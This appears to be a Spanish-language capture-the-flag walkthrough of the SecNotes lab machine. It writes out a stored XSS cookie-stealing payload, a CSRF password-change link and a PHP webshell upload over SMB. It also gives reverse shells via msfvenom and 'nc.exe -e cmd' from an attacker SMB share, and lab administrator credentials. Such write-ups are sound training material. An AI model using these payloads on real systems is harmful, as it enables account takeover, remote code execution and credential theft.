PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast

-En el puerto 80 encontramos un Panel de Login. Nos creamos una cuenta y nos autenticamos

-Al entrar vemos el siguiente texto y una interfaz para crear notas:
	'Due to GDPR, all users must delete any notes that contain Personally Identifable Information (PII) Please contact **tyler@secnotes.htb** using the contact link below with any questions.'

-Le damos a crear una Nota , Probamos un XSS Injection:
	-Title: Prueba XSS
	-Note: <script>alert('XSS')</script>
		-FUNCIONA!!,  Es un Storage XSS

-También en vulnerable a HTML Injection:
	-Title: Prueba HTML
	-Note: <h1>Hola</h1>
		-FUNCIONA!!,  Sale el texto en grande

-Probamos a Robar alguna Cookie:
	-Title: Prueba Cookie
	-Note: <img src=q onerror="new Image().src='http://10.10.14.25/?cookie='+document.cookie">
		-NO FUNCIONA, Solo recibimos nuestra propia cookie

-Nos vamos a la Pestaña de 'Change Password' y encontramos la siguiente Vulnerabilidad:
	-Observamos los parámetros que usa la app para cambiar la passwd por el método POST (Con BurpSuite):
		POST /change_pass.php HTTP/1.1
		Host: 10.10.10.97
		password=test12345&confirm_password=aaa&submit=submit
	-Probamos a **cambiar nuestra contraseña** desde la URL **por el método GET**:
		-http://10.10.10.97/change_pass.php?password=Hola1234&confirm_password=Hola1234&submit=submit
			-HA FUNCIONADO!!, Se nos ha **cambiado la contraseña** desde la URL con el **método GET**
 
## Cross Site Request Forgery (CSRF)

-Si encontramos a alguien que pinche en el siguiente enlace malicioso, podremos cambiar su contraseña directamente y autenticarnos como dicho usuario

-Si nos vamos a la Pestaña de 'Contact Us', podemos mandarle un mensaje a Tyler

-Abrimos un Servidor y probamos a que pinche en nuestra URL a ver si recibimos conexión:
	-python3 -m http.server 80
	-Message: Pincha aquí --> http://10.10.14.25/
		"GET / HTTP/1.1" 200 -
		(FUNCIONA!!, Ha pinchado ya que hemos recibido conexión)

-Le mandamos el siguiente Enlace Malicioso el cual explota el CSRF y cambia la passwd de Tyler:
	-Pincha aquí --> http://10.10.10.97/change_pass.php?password=tyler1234&confirm_password=tyler1234&submit=submit

-Iniciamos sesión con el usuario Tyler y la nueva contraseña que le hemos puesto:
	-Username: tyler
	-Password: tyler1234
		-ESTAMOS DENTRO!!

--------------------------------------------------------------------------

-Dentro hay una nota con una contraseña:
	tyler / 92g!mA8BGjOirkL%OG*&

-Probamos por SMB:
	-smbclient //10.10.10.97/new-site -U tyler -p
	-Password: 92g!mA8BGjOirkL%OG*&
		-Aquí encontramos los archivos de la web del puerto 8808!!

-Podemos subir una webshell y conseguir acceso a la máquina:
	-nano test.php:
		![[Pasted image 20250513184415.png]]
	-Subimos la webshell por SMB:
		-put test.php
	-La visitamos desde la URL y ejecutamos comandos:
		-http://10.10.10.97:8808/test.php?cmd=dir
			**secnotes\tyler**
			(FUNCIONA!!)

-Para Obtener Acceso a la Máquina (2 ways)
	**1-RS con msfvenom**
		-Generamos el siguiente Payload con msfvenom:
			-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.25 LPORT=1234 -f exe -o shell_x64.exe
		-Iniciamos servidor con impacket-smbserver:
			-impacket-smbserver smb $(pwd)
		-Ejecutamos la RS desde la webshell de la URl:
			-http://10.10.10.97:8808/test.php?cmd=\\10.10.14.25\smb\shell_x64.exe
				C:\inetpub\new-site>whoami
					secnotes\tyler (Estamos Dentroo)
	**2-Con nc.exe:**
		-Nos traemos el Netcat y le damos permisos:
			-cp /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe .
			-chmod +x nc.exe
		-Iniciamos servidor con impacket-smbserver
			-impacket-smbserver smb $(pwd)
		-Nos mandamos una RS con el Netcat desde la webshell de la URL:
			-http://10.10.10.97:8808/test.php?cmd=\\10.10.14.25\smb\nc.exe 10.10.14.25 1234 -e cmd
				**C:\inetpub\new-site>whoami**
					**secnotes\tyler**
					(Estamos Dentrooo)

## Escalada de Privilegios

-En C:\Users\tyler\Desktop\bash.lnk vemos el siguiente contenido:
	C:\Windows\System32\bash.exe

-Parece ser un subsistema Linux corriendo el el servidor Windows

-Para encontrar el binario, ejecutamos el siguiente comando:
	-where /R C:\ bash.exe
		C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe

-Ejecutamos el binario:
	-C:\Users\tyler\Desktop> C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
		root@SECNOTES:~# whoami           
			root

-No encontramos el root.txt, leemos el .bash_history:
	-smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$

-Nos conectamos y obtenemos el root.txt:
	-smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
		-get root.txt


